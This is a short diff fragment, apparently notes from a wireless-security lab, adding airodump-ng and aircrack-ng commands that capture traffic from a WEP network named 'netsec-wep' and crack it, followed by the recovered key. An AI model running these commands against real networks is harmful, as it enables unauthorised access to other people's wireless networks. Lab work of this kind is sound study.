@@ -1,0 +1,6 @@
+$ sudo airodump-ng -c 1 --bssid 00:0F:C9:0C:F7:93 -w outputnetsec wlo1mon
+$ aircrack-ng -e netsec-wep outputnetsec-01.cap
+
+[KEY]
+C0:FF:EE:42:21:61:1E:4A:1A:44:6E:2F:20
+C0FFEE4221611E4A1A446E2F20
